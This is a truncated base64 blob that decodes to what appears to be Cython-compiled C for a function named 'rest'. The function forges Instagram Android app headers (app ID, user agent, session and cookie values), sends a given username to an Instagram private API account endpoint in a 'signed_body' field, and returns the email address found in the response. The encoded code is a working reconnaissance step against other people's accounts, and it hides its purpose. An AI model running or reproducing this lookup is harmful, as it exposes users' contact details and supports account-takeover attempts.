iamVjdCogdmFsdWVzWzFdID0gezB9OwogIGludCBfX3B5eF9saW5lbm8gPSAwOwogIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDsKICBpbnQgX19weXhfY2xpbmVubyA9IDA7CiAgUHlPYmplY3QgKl9fcHl4X3IgPSAwOwogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoInJlc3QgKHdyYXBwZXIpIiwgMCk7CiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTAogICNpZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogIF9fcHl4X25hcmdzID0gUHlUdXBsZV9HRVRfU0laRShfX3B5eF9hcmdzKTsKICAjZWxzZQogIF9fcHl4X25hcmdzID0gUHlUdXBsZV9TaXplKF9fcHl4X2FyZ3MpOyBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgPCAwKSkgcmV0dXJuIE5VTEw7CiAgI2VuZGlmCiAgI2VuZGlmCiAgX19weXhfa3d2YWx1ZXMgPSBfX1B5eF9Ld1ZhbHVlc19GQVNUQ0FMTChfX3B5eF9hcmdzLCBfX3B5eF9uYXJncyk7CiAgewogICAgUHlPYmplY3QgKiogY29uc3QgX19weXhfcHlhcmduYW1lc1tdID0geyZfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXNlciwwfTsKICAgIGNvbnN0IFB5X3NzaXplX3QgX19weXhfa3dkc19sZW4gPSAoX19weXhfa3dkcykgPyBfX1B5eF9OdW1Ld2FyZ3NfRkFTVENBTEwoX19weXhfa3dkcykgOiAwOwogICAgaWYgKHVubGlrZWx5KF9fcHl4X2t3ZHNfbGVuKSA8IDApIF9fUFlYX0VSUigwLCAxNjQsIF9fcHl4X0wzX2Vycm9yKQogICAgaWYgKF9fcHl4X2t3ZHNfbGVuID4gMCkgewogICAgICBzd2l0Y2ggKF9fcHl4X25hcmdzKSB7CiAgICAgICAgY2FzZSAgMToKICAgICAgICB2YWx1ZXNbMF0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMCk7CiAgICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMF0pKSBfX1BZWF9FUlIoMCwgMTY0LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7CiAgICAgICAgY2FzZSAgMDogYnJlYWs7CiAgICAgICAgZGVmYXVsdDogZ290byBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjsKICAgICAgfQogICAgICBjb25zdCBQeV9zc2l6ZV90IGt3ZF9wb3NfYXJncyA9IF9fcHl4X25hcmdzOwogICAgICBpZiAoX19QeXhfUGFyc2VLZXl3b3JkcyhfX3B5eF9rd2RzLCBfX3B5eF9rd3ZhbHVlcywgX19weXhfcHlhcmduYW1lcywgMCwgdmFsdWVzLCBrd2RfcG9zX2FyZ3MsIF9fcHl4X2t3ZHNfbGVuLCAicmVzdCIsIDApIDwgKDApKSBfX1BZWF9FUlIoMCwgMTY0LCBfX3B5eF9MM19lcnJvcikKICAgICAgZm9yIChQeV9zc2l6ZV90IGkgPSBfX3B5eF9uYXJnczsgaSA8IDE7IGkrKykgewogICAgICAgIGlmICh1bmxpa2VseSghdmFsdWVzW2ldKSkgeyBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZCgicmVzdCIsIDEsIDEsIDEsIGkpOyBfX1BZWF9FUlIoMCwgMTY0LCBfX3B5eF9MM19lcnJvcikgfQogICAgICB9CiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzICE9IDEpKSB7CiAgICAgIGdvdG8gX19weXhfTDVfYXJndHVwbGVfZXJyb3I7CiAgICB9IGVsc2UgewogICAgICB2YWx1ZXNbMF0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMCk7CiAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzBdKSkgX19QWVhfRVJSKDAsIDE2NCwgX19weXhfTDNfZXJyb3IpCiAgICB9CiAgICBfX3B5eF92X3VzZXIgPSB2YWx1ZXNbMF07CiAgfQogIGdvdG8gX19weXhfTDZfc2tpcDsKICBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjo7CiAgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoInJlc3QiLCAxLCAxLCAxLCBfX3B5eF9uYXJncyk7IF9fUFlYX0VSUigwLCAxNjQsIF9fcHl4X0wzX2Vycm9yKQogIF9fcHl4X0w2X3NraXA6OwogIGdvdG8gX19weXhfTDRfYXJndW1lbnRfdW5wYWNraW5nX2RvbmU7CiAgX19weXhfTDNfZXJyb3I6OwogIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHsKICAgIFB5X1hERUNSRUYodmFsdWVzW19fcHl4X3RlbXBdKTsKICB9CiAgX19QeXhfQWRkVHJhY2ViYWNrKCJuZS5yZXN0IiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgX19QeXhfUmVmTmFubnlGaW5pc2hDb250ZXh0KCk7CiAgcmV0dXJuIE5VTEw7CiAgX19weXhfTDRfYXJndW1lbnRfdW5wYWNraW5nX2RvbmU6OwogIF9fcHl4X3IgPSBfX3B5eF9wZl8ybmVfNHJlc3QoX19weXhfc2VsZiwgX19weXhfdl91c2VyKTsKCiAgCiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkgewogICAgUHlfWERFQ1JFRih2YWx1ZXNbX19weXhfdGVtcF0pOwogIH0KICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gX19weXhfcjsKfQoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8ybmVfNHJlc3QoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZiwgUHlPYmplY3QgKl9fcHl4X3ZfdXNlcikgewogIFB5T2JqZWN0ICpfX3B5eF92X2hlYWRlcnMgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X2RhdGEgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X3Jlc3BvbnNlID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdl9yID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfciA9IE5VTEw7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8yID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8zID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF80ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF81ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF82ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF83ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF84ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF85ID0gTlVMTDsKICBzaXplX3QgX19weXhfdF8xMDsKICBpbnQgX19weXhfbGluZW5vID0gMDsKICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7CiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwOwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJyZXN0IiwgMCk7CgogIAogIHsKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQogICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24KICAgIF9fUHl4X0V4Y2VwdGlvblNhdmUoJl9fcHl4X3RfMSwgJl9fcHl4X3RfMiwgJl9fcHl4X3RfMyk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMSk7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMik7CiAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMyk7CiAgICAgewoKICAgICAgCiAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgxOSk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDE2NywgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1hfUGlnZW9uX1Nlc3Npb25fSWQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfNTBjYzY4NjFfNzAzNl80M2I0XzgwMmVfZmI0MjgyNzkpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTY3LCBfX3B5eF9MM19lcnJvcikKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9YX1BpZ2Vvbl9SYXdjbGllbnR0aW1lLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzE3MDAyNTE1NzRfOTgyKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE2NywgX19weXhfTDNfZXJyb3IpCiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfWF9JR19Db25uZWN0aW9uX1NwZWVkLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzFrYnBzKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE2NywgX19weXhfTDNfZXJyb3IpCiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfWF9JR19CYW5kd2lkdGhfU3BlZWRfS0JQUywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8xXzAwMCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxNjcsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1hfSUdfQmFuZHdpZHRoX1RvdGFsQnl0ZXNfQiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8wKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE2NywgX19weXhfTDNfZXJyb3IpCiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfWF9JR19CYW5kd2lkdGhfVG90YWxUaW1lX01TLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzApIDwgKDApKSBfX1BZWF9FUlIoMCwgMTY3LCBfX3B5eF9MM19lcnJvcikKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9YX0Jsb2tzX1ZlcnNpb25fSWQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jODBjNWZiMzBkZmFlOWUyNzNlNDAwOWYwM2IxODI4MCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxNjcsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1hfSUdfQ29ubmVjdGlvbl9UeXBlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfV0lGSSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxNjcsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1hfSUdfQ2FwYWJpbGl0aWVzLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzNiclR2dykgPCAoMCkpIF9fUFlYX0VSUigwLCAxNjcsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1hfSUdfQXBwX0lELCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzU2NzA2NzM0MzM1MjQyNykgPCAoMCkpIF9fUFlYX0VSUigwLCAxNjcsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X1VzZXJfQWdlbnQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfSW5zdGFncmFtXzEwMF8wXzBfMTdfMTI5X0FuZHJvaWQpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTY3LCBfX3B5eF9MM19lcnJvcikKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9BY2NlcHRfTGFuZ3VhZ2UsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZW5fR0JfZW5fVVMpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTY3LCBfX3B5eF9MM19lcnJvcikKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0Nvb2tpZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9taWRfWlZmR3ZnQUJBQUdvUXFhN0FZM21nb1lCVjFuUCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxNjcsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X0NvbnRlbnRfVHlwZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9hcHBsaWNhdGlvbl94X3d3d19mb3JtX3VybGVuY29kZV8yKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE2NywgX19weXhfTDNfZXJyb3IpCiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfQWNjZXB0X0VuY29kaW5nLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2d6aXBfZGVmbGF0ZSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxNjcsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfSG9zdCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9pX2luc3RhZ3JhbV9jb20pIDwgKDApKSBfX1BZWF9FUlIoMCwgMTY3LCBfX3B5eF9MM19lcnJvcikKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9YX0ZCX0hUVFBfRW5naW5lLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfTGlnZXIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTY3LCBfX3B5eF9MM19lcnJvcikKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0Nvbm5lY3Rpb24sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3Vfa2VlcF9hbGl2ZSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxNjcsIF9fcHl4X0wzX2Vycm9yKQogICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X0NvbnRlbnRfTGVuZ3RoLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzM1NikgPCAoMCkpIF9fUFlYX0VSUigwLCAxNjcsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX3B5eF92X2hlYWRlcnMgPSAoKFB5T2JqZWN0KilfX3B5eF90XzQpOwogICAgICBfX3B5eF90XzQgPSAwOwoKICAgICAgCiAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTg4LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgIF9fcHl4X3RfNSA9IFB5TnVtYmVyX0FkZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzBkMDY3YzJmODZjYWMyYzE3ZDY1NTYzMWM5Y2VjMjQwLCBfX3B5eF92X3VzZXIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAxODgsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgX19weXhfdF82ID0gUHlOdW1iZXJfQWRkKF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fOSk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDE4OCwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NpZ25lZF9ib2R5LCBfX3B5eF90XzYpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTg4LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pZ19zaWdfa2V5X3ZlcnNpb24sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfNCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxODgsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX3B5eF92X2RhdGEgPSAoKFB5T2JqZWN0KilfX3B5eF90XzQpOwogICAgICBfX3B5eF90XzQgPSAwOwoKICAgICAgCiAgICAgIF9fcHl4X3RfNyA9IE5VTEw7CiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF84LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVxdWVzdHMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCAxOTEsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTsKICAgICAgX19weXhfdF85ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzgsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9wb3N0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzkpKSBfX1BZWF9FUlIoMCwgMTkxLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOSk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwoKICAgICAgCiAgICAgIF9fcHl4X3RfMTAgPSAxOwogICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzkpKSkgewogICAgICAgIF9fcHl4X3RfNyA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfOSk7CiAgICAgICAgYXNzZXJ0KF9fcHl4X3RfNyk7CiAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzkpOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzcpOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF85LCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgIF9fcHl4X3RfMTAgPSAwOwogICAgICB9CiAgICAgICNlbmRpZgogICAgICB7CiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzIgKyAoKENZVEhPTl9WRUNUT1JDQUxMKSA/IDIgOiAwKV0gPSB7X19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2h0dHBzX2lfaW5zdGFncmFtX2NvbV9hcGlfdjFfYWNjfTsKICAgICAgICBfX3B5eF90XzggPSBfX1B5eF9NYWtlVmVjdG9yY2FsbEJ1aWxkZXJLd2RzKDIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCAxOTEsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpOwogICAgICAgIGlmIChfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2hlYWRlcnMsIF9fcHl4X3ZfaGVhZGVycywgX19weXhfdF84LCBfX3B5eF9jYWxsYXJncysyLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE5MSwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZGF0YSwgX19weXhfdl9kYXRhLCBfX3B5eF90XzgsIF9fcHl4X2NhbGxhcmdzKzIsIDEpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTkxLCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9PYmplY3RfVmVjdG9yY2FsbF9DYWxsRnJvbUJ1aWxkZXIoX19weXhfdF85LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzEwLCAoMi1fX3B5eF90XzEwKSB8IChfX3B5eF90XzEwKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCksIF9fcHl4X3RfOCk7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwOwogICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDE5MSwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgIH0KICAgICAgX19weXhfdF82ID0gX19weXhfdF81OwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF82KTsKICAgICAgX19weXhfdF8xMCA9IDA7CiAgICAgIHsKICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF82LCBOVUxMfTsKICAgICAgICBfX3B5eF90XzQgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfanNvbiwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8xMCwgKDEtX19weXhfdF8xMCkgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMTkyLCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgICAgfQogICAgICBfX3B5eF92X3Jlc3BvbnNlID0gX19weXhfdF80OwogICAgICBfX3B5eF90XzQgPSAwOwoKICAgICAgCiAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0RpY3RfR2V0SXRlbShfX3B5eF92X3Jlc3BvbnNlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZW1haWwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxOTMsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgICAgX19weXhfdl9yID0gX19weXhfdF80OwogICAgICBfX3B5eF90XzQgPSAwOwoKICAgICAgCiAgICB9CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgICBnb3RvIF9fcHl4X0w4X3RyeV9lbmQ7CiAgICBfX3B5eF9MM19lcnJvcjo7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7CgogICAgCiAgICAgewogICAgICBfX1B5eF9BZGRUcmFjZWJhY2soIm5lLnJlc3QiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF80LCAmX19weXhfdF81LCAmX19weXhfdF82KSA8IDApIF9fUFlYX0VSUigwLCAxOTQsIF9fcHl4X0w1X2V4Y2VwdF9lcnJvcikKICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzQpOwogICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF82KTsKCiAgICAgIAogICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9ub19SRVNUKTsKICAgICAgX19QeXhfWERFQ1JFRl9TRVQoX19weXhfdl9yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X25vX1JFU1QpOwogICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICBnb3RvIF9fcHl4X0w0X2V4Y2VwdGlvbl9oYW5kbGVkOwogICAgfQoKICAgIAogICAgX19weXhfTDVfZXhjZXB0X2Vycm9yOjsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzIpOwogICAgX19QeXhfWEdJVkVSRUYoX